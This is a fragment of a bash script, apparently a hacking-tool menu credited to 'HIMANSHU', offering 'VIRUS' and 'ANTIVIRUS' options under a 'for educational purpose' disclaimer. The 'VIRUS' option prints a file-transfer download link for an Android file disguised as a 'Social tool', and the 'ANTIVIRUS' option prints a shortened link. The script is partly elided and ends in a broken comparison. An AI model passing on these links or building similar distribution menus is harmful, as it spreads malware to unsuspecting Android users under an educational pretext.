...
'
echo " " 
echo -e "$red                       ▶Coded by$grn HIMANSHU$red◀$rset"
echo -e "$red                      ⫸$ylo  PROFESSOR$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [FOR EDUCATIONAL PURPOSE]$rset"
echo " "
echo " "
}
baner1(){
...
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] VIRUS"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] ANTIVIRUS"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] EXIT"
echo " "
echo " "
...
echo " "
echo " "
echo -e "\e[92m VIRUS LINK
                                 👇👇👇

         \e[92mL1NK :- \e[96mhttps://www.transfernow.net/dl/Socialtoolforandroid/oGnlUduB\e[91m
...
echo " "
echo " "
echo -e "\e[93m  ANTIVIRUS LINK
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    👆👆👆
USE ONLY FOR EDUCATIONAL PURPOSE AND GIVE CREDITS IF MODIFIED."
echo
echo -ne "\e[92m#Type exit : "
read exit
if [ $exitz = "exit" ];
